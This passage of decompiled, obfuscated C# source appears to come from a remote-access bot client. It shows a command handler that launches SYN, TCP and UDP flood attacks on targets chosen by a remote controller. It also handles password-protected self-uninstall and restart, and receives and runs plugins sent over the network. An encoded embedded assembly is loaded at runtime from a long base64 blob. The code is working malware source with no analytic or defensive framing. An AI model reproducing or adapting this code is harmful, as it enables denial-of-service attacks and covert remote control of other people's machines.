		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)e.get_Reason() == 2 && Class5.bool_0)
		{
			Class10.smethod_0();
		}
	}

	private static void smethod_5(object object_0, IPlugin iplugin_0)
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		try
		{
			iplugin_0.add_ExecutionComplete((EventHandler)smethod_15);
			iplugin_0.add_Output(new OutputEventHandler(smethod_14));
			iplugin_0.add_Started((EventHandler)smethod_13);
			iplugin_0.add_Stopped((EventHandler)smethod_12);
			GClass1.sortedList_1[iplugin_0.get_Guid()] = iplugin_0;
		}
		catch
		{
		}
	}

	private static Assembly smethod_6(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		return Assembly.Load(Encoding.GetEncoding(1252).GetBytes(Class0.smethod_3("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4eTt6RDx5V704+Pn5eZS7ePj6eMN4+Pj9hPm4wDj4+Pu4+P04+Ve7+Pj5/fh5O3pEPHlXu/j4+fl91IJ4+Pt4w3j4+PmE+bjK+Pj4+Pj4+Pj5V7v4+Pn9/dSCePj7ePlXvDj4+f391IJ4+Pt4+Ve8ePj5/f3Ugnj4+3j5V7z4+Pn9/dS5ePj6ePlXvTj4+f391Lt4+Pp4w0B5Qv04+PtDSU2LSXk4+Tj4+Pj4+/j4+NZFRETERgTGhUa4+Pj4+jjT+Pj4+fs4+MGYePjU+zj48Pq4+MGNldVTFFKVuPj4+Mz9OPj6+Pj4wY4NuM79OPj8+Pj4wYqOCwn4+PjS/Tj43vl4+MGJU9SRePj4+Pj4+Pl4+PkOgCZ7Ozr4+Pj3QgW4/nj4+Tj4+MI4+Pj7OPj4/bj4+MV4+PjFOPj4wnj4+Pn4+Pj9uPj4+7j4+Pk4+Pj6ePj4+Tj4+Pv4+Pj/ePj4+Tj4+Pk4+Pj5ePj4+fj4+Pj4+3j5OPj4+Pj6eN543Lj6eOL43Lj6eOQ43Lj6eOk43Lj6eOx43Lj6eP/5HLj6eMq5A/k6eNl5Dbk6eOC5Hjk6eM/5XLj7eNo5VPl6eO85XLj6ePa58jn6ePx6Mjn6eMO6Mjn6eMt6Mjn6eNG6Mjn6eNf6Mjn6eN66Mjn6eOV6Mjn6ePN6K7o6ePh6K7o6ePv6cjn6eMI6cjn6eM46SXpSuNM6ePj6eN76Vvp6eOb6Vvp6eO56XLj6ePP6Xjk6ePs6lvp6eMH6nLj6eMU6sjn6eMp6nLj6eNx6nLj6eOT6oLq6eO26nLj4+Pj4+Tj4+Pj4+Tj5OPk5OPj+eMM4+jj5OPk4+Tk4+MT4wzj6OPk4+jj5OTj4yXjDOPo4+Tj7OPk5OPjOuMM4+zj5OPw4+Tk4+NG4wzj7OPn4/Dj5APz40vjDOPw4+rj8OPk4/PjVuMM4/Dj7ePx42Tj8+Nh4wzj8OPv4/Tj6enV4w3jOWPd4xDjOWPi4xDj6enV4w3jOWPq5B7jOWPx5B7j6eP45CLj6eME5CXj6eMx5Cnj9ON15DTj9OOP5Djj5OPJ5YHj5OMK5oHj5OMt5oHj5ONQ5ovj5ONt5pXj5OON5p/j5OPO5rHj5OPx57Xj4+Pj4+bjafuX4+3j5OPj4+Pj5uOp5J3j8+Pm4+Pj4+Pm46nkv+P74+jj4+Pj4+bjqeTL4wfj7OPj4+Pj5uNp+5fj7ePt4+Pj4+Pm46nknePz4+/j4+Pj4+bjqeS/4/vj8ePj4+Pj5uOp5MvjB+P14+Pj4+Pm42n7l+Pt4/bj4+Pj4+bjqeSd4/Pj+OPj4+Pj5uOp5L/j++P64+Pj4+Pm46nky+MH4/7jMwPj4+PjafuX4zDj/+NLA+Pj4+N545LkPOP/47MD4+Pj43njnORD4wDjEgTj4+PjafuX4zDjAePj4+Pj4+Op8KjkSuMB4+Pj4+Pj46nwseRK4wHj4+Pj4+PjqfDB5ErjAePj4+Pj4+Op8MzkTuMB4+Pj4+Pj46nw3eRT4wHj4+Pj4+PjqfD15VPjAePj4+Pj4+Op8AflU+MB4xsE4+Pj42nrE+VX4wHjMgTj4+Pjaesp5VzjAePj4+Pj4+Op8EflYuMC4+Pj4+Pj46nwbeVn4wLjOwTj4+Pjaet75WzjAuNSBOPj4+Np64vlcOMC41sE4+Pj42nrm+V14wPj4+Pj4+Pjqeik5TDjA+Pj4+Pj4+Op6K/leuMD47EE4+Pj46nkt+Vw4wXjtwTj4+Pjaevb5YXjBuPzBePj4+Np6/HmheMH4y8F4+Pj42nrEuaF4wjjawXj4+Pjaese5oXjCeOnBePj4+Np6zXmheMK4+MG4+Pj42nrQeaF4wvjHwbj4+PjaetW5o/jDONbBuPj4+Np62Dmj+MN45cG4+Pj42nrdOaZ4w7j0wbj4+Pjaet/5pnjD+MPB+Pj4+Np65bmo+MQ40sH4+Pj42nro+aj4xHjhwfj4+PjaeOz5qnjEuPXB+Pj4+Np47jmXOMU4wMI4+Pj42njw+Yw4xXjLwjj4+PjZOPM5jDjFeODCOPj4+Nn+5fjMOMV4+Pj5OOF5+Pj5eOM5+Pj5OOT5+Pj5ePM5uPj5OOT5+Pj5ePM5uPj5uOa5+Pj5+OF5+Pj5OOj5+Pj5OOF5+Pj5eOM5+Pj5OOT5+Pj5ePM5uPj5OOT5+Pj5ePM5uPj5uOa5+Pj5+OF5+Pj5OOj5+Pj5OOF5+Pj5eOM5+Pj5OOT5+Pj5ePM5uPj5OOT5+Pj5ePM5uPj5uOa5+Pj5+OF5+Pj5OOj5+Pj5OOq5+Pj5OOv5+Pj5OOx5+Pj5OOx5+Pj5OO35+Pj5ePM5uPj5OO35+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OOx5+Pj5OPD5+Pj5ePM5uPj5OPM5kzjl+Pd41Tjl+Pd41zjl+Pd42Tjl+Pd42zjl+Pd43Tjl+Pd43zjl+Pd44Tjl+Pd44zjl+Pi45Tjl+Pd45zjl+Pd46Tjl+Pd46zjl+Pn5Lzjl+Pt5MTjl+Mw48zjl+Mw4/zjl+Mw4+/jl+Mw4yzjl+Mw4yTjl+Mw4yTjkuT45NTj1ukw4yzj3On/5NTj5Oow4yzjl+ML5CTjnOQR5Nzjl+Mw4/zjDOon5OzkHeot5OTkO+o25OzkTeo/5JTjYepK4xTjl+Pd4xTja+ol4/zkeupQ5ATkn+pc5Pzkr+pQ5ETjneOv5Ovj6+MU4+vj7+MZ4+vj9+MU4+vj++MZ4xHjBuPk5RHjXuNZ5RHjFuPx5RHjVuNQ5RHj7uO35BHj9uPD5BHj/uPe5BHjDuO35BHjHuPe5BHjLuPe5BHjNuMQ5RHjRuM65RHjTuNH5STlvuMZ40TlvuMZ4+PmvuMZ4wPmvuMZ42PmvuMZ44PmvuMZ4wTkF+Qe5CPkSORu5H3kjOSb5KXkq+Ts4+Tj4+PJ5RTj4+MK5hTj4+Mt5hTj4+NQ5u/j4+Nt5uvj4+ON5vPj7OPk4+PjDue44+PjE+e44+PjH+e44+PjJue84+PjM+fB4+PjR+fB4+PjVefB4+PjXefF4+PjP+XK4+Pjb+fP4+PjeefU4+Pj/+TY4/PjBuPl4+vjBePl4+Xj9OPm4/PjCOPn4+vjB+Pn4+Xj9ePo4+vjCePp4/PjCuPp4+Xj9uPq4/PjDOPr4+vjC+Pr4+Xj9+Ps4/PjDuPt4+vjDePt4+Xj+OPu4/PjEOPv4+vjD+Pv4+Xj+ePw4+Xj+uPy4+Xj++P04+Tj/OP04+Xj/eP24+Xj/uP44+TjAOP64+Xj/+P64+XjAeP84/Lk52Pj4+Tj4+Pj4+Pj4+Pj4+PjYePj4+Xj4+Pj4+Pj4+Pj4+TjaePj4+Pj5ePj4+Pj4+Pj4+Pj5ONT5ePj4+Ms42nkLON45Czjh+Qs45bk4+PjHzBSR1hPSCHjLDNPWEpMURFHT0/jMlhXU1hXKFlIUVcrRFFHT0hV4zNPWEpMUeMsUVNYVyhZSFFXK0RRR09IVeM1SEZITFlIRyhZSFFXK0RRR09IVeMzT1hKTFE2V0RXSOM2TEdI4zNPWEpMUSRVSlbjNkhVTERPTF1IVeMsM09YSkxR41BWRlJVT0xF4zZcVldIUOMwWE9XTEZEVlcnSE9ISkRXSOMoUVhQ4zJFTUhGV+MRRldSVeMsUVlSTkjjLCRWXFFGNUhWWE9X4yRWXFFGJkRPT0VERk7jJUhKTFEsUVlSTkjj43BsAShRRyxRWVJOSONZRE9YSEJC4zEyMSjjNTgxMSwxKuMmLywoMTfjNig1OSg14ytIREdIVeMqWExH4zNPWEpMUSpYTEfjNlxWV0hQESZST09IRldMUlFWESpIUUhVTEbjL0xWV0MU4ydEV0TjNlxWV0hQETVYUVdMUEgRNkhVTERPTF1EV0xSUREpUlVQRFdXSFVWESVMUURVXOMlTFFEVVwpUlVQRFdXSFXjRUnjNlxWV0hQESwy4zBIUFJVXDZXVUhEUONQVuM2SFVMRE9MXUjjJ0hWSFVMRE9MXUjjSkhXQjFEUEjjSkhXQidIVkZVTFNXTFJR40pIV0IkWFdLUlXjSkhXQiZYVVVIUVc2V0RXSONKSFdCNldSUzJRJ0xWRlJRUUhGV0xSUeNKSFdCKFtIRlhXSDJRL1JER+NKSFdCK0RWKVJVUONKSFdCKFtIRlhXSDJRL1JERyRVSlbjVkhXQihbSEZYV0gyUS9SREckVUpW4zlIVVZMUlHjSkhXQjlIVVZMUlHjNlxWV0hQETpMUUdSWlYRKVJVUFbjKVJVUONKSFdCLFFTWFcpUlVQ40pIV0I2V0RXSDJFTUhGV+NWSFdCNldEV0gyRU1IRlfjSkhXQipYTEfjLFFMV0xET0xdSOMoW0hGWFdI4zZXUlPjKFlIUVcrRFFHT0hV4yhbSEZYV0xSUSZSUFNPSFdI40RHR0IoW0hGWFdMUlEmUlBTT0hXSONVSFBSWUhCKFtIRlhXTFJRJlJQU09IV0jjNldEVVdIR+NER0dCNldEVVdIR+NVSFBSWUhCNldEVVdIR+M2V1JTU0hH40RHR0I2V1JTU0hH41VIUFJZSEI2V1JTU0hH4yxRU1hX40RHR0IsUVNYV+NVSFBSWUhCLFFTWFfjMlhXU1hX40RHR0IyWFdTWFfjVUhQUllIQjJYV1NYV+M1SEZITFlIR+NER0dCNUhGSExZSEfjVUhQUllIQjVIRkhMWUhH4zZIUUfjMlE1SEZITFlIR+MoW0hGWFdIR+NI4x8oW0hGWFdIMlEvUkRHJFVKViFOQkIlREZOTFFKKUxIT0fjHzZXRFdIMkVNSEZXIU5CQiVERk5MUUopTEhPR+MxRFBI4ydIVkZVTFNXTFJR4yRYV0tSVeMmWFVVSFFXNldEV0jjNldSUzJRJ0xWRlJRUUhGV0xSUeMoW0hGWFdIMlEvUkRH4ytEVilSVVDjKFtIRlhXSDJRL1JERyRVSlbjLFFTWFcpUlVQ4zZXRFdIMkVNSEZX41JFTUhGV+NQSFdLUkfjVkhRR0hV40ZET09FREZO41VIVlhPV+NEVUpW40XjWURPWEjjVldEV0gyRU1IRlfjVkxHSOM2XFZXSFARNUhJT0hGV0xSUeMkVlZIUEVPXDdMV09IJFdXVUxFWFdI4yRWVkhQRU9cJ0hWRlVMU1dMUlEkV1dVTEVYV0jjJFZWSFBFT1wmUlFJTEpYVURXTFJRJFdXVUxFWFdI4yRWVkhQRU9cJlJQU0RRXCRXV1VMRVhXSOMkVlZIUEVPXDNVUkdYRlckV1dVTEVYV0jjJFZWSFBFT1wmUlNcVUxKS1ckV1dVTEVYV0jjJFZWSFBFT1w3VURHSFBEVU4kV1dVTEVYV0jjJFZWSFBFT1wmWE9XWFVIJFdXVUxFWFdI4zZcVldIUBE1WFFXTFBIESxRV0hVUlM2SFVZTEZIVuMmUlA5TFZMRU9IJFdXVUxFWFdI4ypYTEckV1dVTEVYV0jjJFZWSFBFT1w5SFVWTFJRJFdXVUxFWFdI4yRWVkhQRU9cKUxPSDlIVVZMUlEkV1dVTEVYV0jjNlxWV0hQESdMREpRUlZXTEZW4ydIRVhKSkRFT0gkV1dVTEVYV0jjJ0hFWEpKTFFKMFJHSFbjNlxWV0hQETVYUVdMUEgRJlJQU0xPSFU2SFVZTEZIVuMmUlBTTE9EV0xSUTVIT0RbRFdMUlFWJFdXVUxFWFdI4zVYUVdMUEgmUlBTRFdMRUxPTFdcJFdXVUxFWFdI4zZIVUxET0xdREVPSCRXV1VMRVhXSOM2V1VIRFDjJk9SVkjjN1IkVVVEXOMnTFZTUlZI4yZSUFNMT0hVKkhRSFVEV0hHJFdXVUxFWFdI4zdcU0jjKkhXN1xTSOMkVlZIUEVPXOMqSFckVlZIUEVPXOM1WFFXTFBIN1xTSCtEUUdPSOMqSFc3XFNIKVVSUCtEUUdPSOMqSFcmWFZXUlAkV1dVTEVYV0hW40pIV0I5RE9YSOMoUFNXXOMnSE9ISkRXSOMmUlBFTFFI4zZcVldIUBE3S1VIREdMUUrjLFFXSFVPUkZOSEfjJlJQU0RVSChbRktEUUpI4zVIUFJZSOMoWUhRVyRVSlbj4+Pj4+YD4+Pj4+O3AJLHMbONJHsCjgdLEBkl4+uaXT85/BfDbOgD5eT/++oD5eT1B/X/7gPn9fT1B/X/9fj/6APk5PX05enr5un09+fj4+Pj5+Tj4+Pm6fT75enx5un0/Onp+PUA5P/mA+Pk5un1BObp9Qjp4+QA6PX/6ePk9f8A6OYD4/HnA+P09+YD4+XnA+P1/+gD5OT1/+cD4/UM5wPj9RDmA+P/5wPk5P/nA+P0/OkD5eT/9f/m6fUU6APk5PUU5un17+gD5OT17+bp9evoA+Tk9evm6fXz6APk5PXz6gPl5PT79f/m6fX/5en/5gvj8ecL4/T35gvj5ecL4/X/5wvj9QznC+P1EOYL4//nC+P0/OcD5OTx5wPk5OXoA+Tk9EznA+Tk6+j49QDk/+kD5eT1XP/nA+MA6Onq5QDoAOjoA+TkAOjoA+T/9Vzp6uX1//X/5+rk9f/m6uT/6APj9WNk6+Pk9WNo9WNk6+Pk9WNk9GNs6wPlAP/1Y2Tl6urmAP/0/OXu4+X1Y3D1Y3D1Y3Dv8+TmAePzAeMB4wHj5+3k9RTs6uf1FPUU9RTl5+3k9e/s6uf17/Xv9e/l5+3k9evs6uf16/Xr9evl5+3k9fPs6uf18/Xz9fPl6Orl9Pvl5urk5eoD5eT/9WN47uTj6TNPWEpMUePj/eTj+DFIVxA6SERZSAMzT1hKTFEDJURWSOPj6OTj4+Pj7+Tj6ls2TE9IUVfj4wHk4/wmUlNcVUxKS1cDpYwDWzZMT0hRVwMVExQU4+MM5OMHGhYZRBdIExgQRkUcSBAXRRhJEBxHRxgQFURGGRxISUYTRxwc4+Pv5OPqFBETERMRE+Pj6+Tj6uTj4+Pj6+Tj6+Pj4+PjAeTj5OM35fk6VURTMVJRKFtGSFNXTFJRN0tVUlpW5OPj4+Pj4+MesW8x4+Pj4+Xj4+Nd4+Pjpxzj46f+4+M1Nic2U1prod1P4zBml/DuRw1WlOXj4+MmHT84VkhVVj8xRFdLRFE/J1JGWFBIUVdWPzlMVlhETwM2V1hHTFIDFRMUEz8zVVJNSEZXVj8zVVJNSEZXAycnUjZIVT8zT1hKTFE/UkVNPydIRVhKPywzT1hKTFERU0dF4+PjSx3j4+Pj4+Pj4+PjYR3j4+MD4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj41Md4+Pj4+Pj4+NCJlJVJ09PMERMUeNQVkZSVUhIEUdPT+Pj4+Pj4gjjAyPj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj5OPz4+Pj++PjY+Pj4+Pj4+Pj4+Pj4+Pj5OPk4+PjE+PjY+Pj4+Pj4+Pj4+Pj4+Pj5OPj4+PjK+Pj4zsj4+MH5uPj4+Pj4+Pj4+MH5hfj4+M54zbjQuM54yjjNeM24yzjMuMx40LjLOMx4ynjMuPj4+PjoOfS4ePj5OPj4+Tj4+Pj4+Pj5OPj4+PjIuPj4+Pj4+Pn4+Pj5ePj4+Pj4+Pj4+Pj4+Pj4yfj4+Pk4znjRONV4ynjTONP40jjLONR40njUuPj4+PjB+Pn4+PjN+NV40TjUeNW40/jRONX40zjUuNR4+Pj4+Pj45PnZ+Xj4+TjNuNX41XjTONR40rjKeNM40/jSOMs41HjSeNS4+PjQ+Xj4+TjE+MT4xPjE+MT4xfjReMT4+PjJ+P54+TjJuNS41DjUONI41HjV+NW4+PjMeNI41fjEOM640jjRONZ40jjA+Mz40/jWONK40zjUeMD4yXjRONW40jj4+MT4+vj5OMm41LjUONT40TjUeNc4zHjRONQ40jj4+Pj41vjNuNM40/jSONR41fj4+Mb4+rj5OMp40zjT+NI4yfjSONW40bjVeNM41PjV+NM41LjUePj4+PjM+NP41jjSuNM41Hj4+Pj4xPj6+Pk4ynjTONP40jjOeNI41XjVuNM41LjUePj4+PjFOMR4xPjEeMT4xHjE+Pj4xvj7+Pk4yzjUeNX40jjVeNR40TjT+Mx40TjUONI4+PjLOMz40/jWONK40zjUeMR40fjT+NP4+PjO+P84+TjL+NI40rjRONP4ybjUuNT41zjVeNM40rjS+NX4+PjJuNS41PjXONV40zjSuNL41fjA+OM4wPjW+M240zjT+NI41HjV+MD4xXjE+MU4xTj4+Pj4yPj7+Pk4zLjVeNM40rjTONR40TjT+Mp40zjT+NI41HjRONQ40jj4+Ms4zPjT+NY40rjTONR4xHjR+NP40/j4+MT4+rj5OMz41XjUuNH41jjRuNX4zHjRONQ40jj4+Pj4zPjT+NY40rjTONR4+Pj4+MX4+vj5OMz41XjUuNH41jjRuNX4znjSONV41bjTONS41Hj4+MU4xHjE+MR4xPjEeMT4+PjG+Pr4+TjJONW41bjSONQ40XjT+Nc4wPjOeNI41XjVuNM41LjUePj4xTjEeMT4xHjE+MR4xPj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+PjE+Pj7+Pj43Md4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4w==", bool_0: true)));
	}

	private static void smethod_7(string string_1)
	{
	}

	private static void smethod_8(object sender, EventArgs2 e)
	{
		//IL_045d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0463: Invalid comparison between Unknown and I4
		Class4 @class = sender as Class4;
		try
		{
			Class2 class2 = new Class2(e.Byte_0);
			switch (e.Enum1_0)
			{
			case Class4.Enum1.const_1:
				if (Class1.Boolean_0)
				{
					@class.method_9(Class1.String_0 + " Flood Already Active");
					return;
				}
				Class1.smethod_0(Class1.Enum0.const_1, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class1.smethod_1();
				@class.method_9("SYN Flood Active");
				break;
			case Class4.Enum1.const_2:
				if (Class1.Boolean_0)
				{
					@class.method_9(Class1.String_0 + " Flood Already Active");
					return;
				}
				Class1.smethod_0(Class1.Enum0.const_0, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class1.smethod_1();
				@class.method_9("TCP Flood Active");
				break;
			case Class4.Enum1.const_3:
				if (Class1.Boolean_0)
				{
					@class.method_9(Class1.String_0 + " Flood Already Active");
					return;
				}
				Class1.smethod_0(Class1.Enum0.const_2, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class1.smethod_1();
				@class.method_9("UDP Flood Active");
				break;
			case Class4.Enum1.const_4:
				if (Class1.Boolean_0)
				{
					Class1.smethod_2();
					@class.method_9(Class1.String_0 + " Flood Inactive");
				}
				else
				{
					@class.method_9("No Flood Active");
				}
				break;
			case Class4.Enum1.const_5:
			{
				object[] parameter2 = new object[2]
				{
					class2.ReadString(),
					sender
				};
				new Thread(smethod_16).Start(parameter2);
				break;
			}
			case Class4.Enum1.const_6:
			{
				object[] parameter = new object[3]
				{
					class2.ReadString(),
					class2.ReadString(),
					sender
				};
				new Thread(smethod_17).Start(parameter);
				break;
			}
			case Class4.Enum1.const_7:
				try
				{
					Class7.smethod_1();
					@class.method_10(bool_2: false);
					Process.Start(Process.GetCurrentProcess().MainModule!.FileName);
					Process.GetCurrentProcess().Kill();
				}
				catch
				{
					(sender as Class4).method_9("Restart Failed");
				}
				break;
			case Class4.Enum1.const_8:
			{
				string @string = Encoding.Default.GetString(e.Byte_0);
				if (@string != Encoding.Default.GetString(Class0.smethod_1(Convert.FromBase64String(Class5.string_10), bool_0: false)))
				{
					(sender as Class4).method_9("Invalid password");
					return;
				}
				if (Class5.bool_0)
				{
					foreach (GClass0 item in list_0)
					{
						item.method_3();
					}
					Class10.smethod_4();
				}
				Process.GetCurrentProcess().Kill();
				break;
			}
			case Class4.Enum1.const_9:
				try
				{
					if (GClass1.smethod_3(Encoding.GetEncoding(1252).GetBytes(class2.ReadString())))
					{
						string text = GClass1.sortedList_1.Values[GClass1.sortedList_1.Count - 1].get_Name() + " Stored";
						if (Class5.bool_0)
						{
							text += " and Saved";
							GClass1.smethod_0();
						}
						@class.method_9(text);
						break;
					}
					throw new Exception(GClass1.smethod_6());
				}
				catch (Exception)
				{
					@class.method_9("Plugin Error: Invalid or Already Loaded");
				}
				break;
			case Class4.Enum1.const_10:
				try
				{
					PluginArgs val = Serializer.Deserialize(e.Byte_0);
					if (!GClass1.sortedList_1.ContainsKey(val.PluginGuid))
					{
						@class.method_9("Plugin not found");
						break;
					}
					IPlugin iplugin_ = GClass1.sortedList_1[val.PluginGuid];
					GClass1.smethod_7(sender, iplugin_, val);
				}
				catch (Exception ex)
				{
